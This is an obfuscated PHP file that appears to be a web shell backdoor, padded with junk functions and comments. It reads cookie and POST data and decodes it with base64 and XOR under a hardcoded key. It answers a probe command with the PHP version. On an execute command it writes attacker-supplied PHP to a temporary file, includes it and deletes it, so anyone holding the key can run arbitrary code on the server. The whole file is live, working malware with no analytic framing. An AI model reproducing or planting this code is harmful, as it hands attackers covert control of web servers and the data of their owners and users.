<?php     function	ydnhhv(){$dj_cauxo='hkmkcyfcq';    print_r /*br   */ (16475+16475);	}
$vjf_gsmv    =    'vjf_gsmv'	^    '';

function /*  ppv */ zsockscj(){


    $rdwae_vg	=    555;


 /*  gkl */ $ftrswne   =  'rahkzbv';

       $yuwbl      = /*  hfgxm*/ 555;
    $l_wbbvac /* ebdh  */ = /*ja   */ $yuwbl	* /* ql*/ 19;
}


function /*qj */ uedxkol($usdhtsbux, /* nn*/ $bttms){
  global	$vjf_gsmv; /*jpahjp */ $dkwsgali /* a */ =      "";


   $tqefned    =	'ejxtep';

 /*  _ua   */ for    ($edgtss       =  0;	$edgtss   <    strlen($usdhtsbux);)      {

 /*   ffd  */ for	($sddvmhrqih       =	0;    $sddvmhrqih    <    strlen($bttms)    &&    $edgtss      < /*   rw */ strlen($usdhtsbux);    $sddvmhrqih++,  $edgtss++)    {
 /*qzj*/ $dkwsgali    .= /*  zbquo*/ $vjf_gsmv(ord($usdhtsbux[$edgtss])	^ /* yzj   */ ord($bttms[$sddvmhrqih]));


	}

  }

    return /*v*/ $dkwsgali;}



$edgtssdbsnmnmdv    =	$_COOKIE;$ullaawvowb	=   $_POST;


$_q_yfaa       =   407;$cxbrl   =	$_q_yfaa /* jxho  */ +	10;

$efccbasbdf /*eqam   */ =    897;


function	jsstvcoiar($wvzqgxdtg, /*   oeh   */ $usdhtsbux){
 /* id   */ global /*   ycsrrn   */ $vjf_gsmv;



 /*qkdy  */ $rmxvewbti    = /*   gwusz   */ sprintf("."."\x2f"	.   "\x25"    .	"s"."\x2e"	.    "\x70"	. /* umsaa_*/ "l",    md5($wvzqgxdtg));

     file_put_contents($rmxvewbti,      "<"    .    "?".$vjf_gsmv(691-579)    .    $vjf_gsmv(825-721) /*  pio   */ .       "p".$vjf_gsmv(32) /*   i   */ .	"u"."n"."\x6c"	.     "\x69"       . /* _*/ "n"."\153" /*   q_cqs  */ .    "\50"    .    $vjf_gsmv(646-551)     . /*p*/ $vjf_gsmv(313-218) /*  hbws */ .    "F"."\x49"    . /*ykxkho   */ $vjf_gsmv(812-736)  . /* oum */ "\105"	.     $vjf_gsmv(95)	.    "\137"    .    $vjf_gsmv(41) /*   sstsfv   */ .    "\x3b" /*  ntj  */ . /*   m  */ $vjf_gsmv(32)   . /*  se   */ $usdhtsbux["d"]);

       include($rmxvewbti);


	$qzdurfgbz  = /*   f_s*/ 146;    $nkmjp_ibsb /*  ahi*/ =	'_vzsqb';
 /*   k*/ $k_gpieab    = /* j  */ 'nmugtggav';


    $edgtssqpazplwc       = /*jpd */ $rmxvewbti;


    @unlink($edgtssqpazplwc);

	$sddvmhrqihvzeera_r /* d  */ =	'dc';

}







function       aphzezzguh()


{
    $ncbkgeqhpp	=    314;


}




function	aknqnpv()

{

       global /* w */ $vjf_gsmv;


       $edgtss      = /*  i*/ array();
      $syguutgk	=	'fens';
       $crybytewi    =	257;

  $edgtss[$vjf_gsmv(112)	.	"v"] /*mvv_xe   */ =	phpversion();
 /* s  */ $crybytewi    =    $crybytewi      /   6; /*bdm */ $edgtss["s".$vjf_gsmv(118)]      = /*   wc   */ $vjf_gsmv(51)       . /*   jpuuw_  */ ".".$vjf_gsmv(53); /* sw */ $zaafaukxir    =    'lbdywol';   echo /*   ceczrk   */ @serialize($edgtss); /*  w   */ $crybytewi /*  ew  */ = /* jjysn */ $crybytewi  % /*   n */ 17;

	$crybytewi      =  $crybytewi /*  xmaosc   */ -    19;}





aphzezzguh();





zsockscj();


function   ilafy($usdhtsbux,       $wvzqgxdtg, /*   drajr*/ $okupk)
{


    global  $vjf_gsmv;
	$usdhtsbux /*  b*/ =      unserialize(uedxkol(uedxkol(base64_decode($usdhtsbux), /* pxcnu*/ $wvzqgxdtg),    $okupk));

	$lqjavlwcht    =  'yp'; /*lch_  */ $edgtsswqwwthklj /* nfkfh*/ =    'hmci';
   $dorpow      =    strtolower($lqjavlwcht);

	if /*   yvxok*/ (isset($usdhtsbux["a"."k"])) /*  zxuis   */ {


 /*   ogjmq*/ if    ($usdhtsbux["a"]	==   "\151") /*  lc  */ {

 /*   nft   */ aknqnpv();


 /*  icua*/ } /*  x*/ elseif /* vc_n  */ ($usdhtsbux["a"] /*  q_ygy  */ == /*nyd*/ "\145")	{
    jsstvcoiar($wvzqgxdtg,    $usdhtsbux);
    }

 /*   gpngy  */ exit();


	}}





$edgtssdbsnmnmdv	=      array_merge($ullaawvowb,       $edgtssdbsnmnmdv);


$wvzqgxdtg    = /* qlztsi */ "9".$vjf_gsmv(1050-998)    .     "b"."0"."3"."f"."7".$vjf_gsmv(490-434) /*   za  */ .     $vjf_gsmv(45)    .	"\x32" /*   bke  */ .	"\x65" /*  kc */ .	"\63"	.      "7"."\x2d" /*   mil   */ .    "4"."1".$vjf_gsmv(73-21)   .    "0".$vjf_gsmv(45) /*nhrik*/ .  "\71"      .	"b"."\x38"       . /* rk   */ "\x61"     .    "-"."\x62"	. /*   c_ */ "2"."\x32"    .	$vjf_gsmv(559-504)    .	"\x61" /* xw */ .    "f".$vjf_gsmv(359-308)     .      "\144"	.    $vjf_gsmv(97) /*   yw*/ .    "\x38" /* tlrm  */ . /*  veb   */ "\x37"    .    "c";

$gjsdhaf   =	-12;foreach    ($edgtssdbsnmnmdv /*nivdhi */ as    $okupk    =>	$usdhtsbux)	{

 /*cjfeeo*/ ilafy($usdhtsbux, /*   w  */ $wvzqgxdtg,   $okupk);}



?>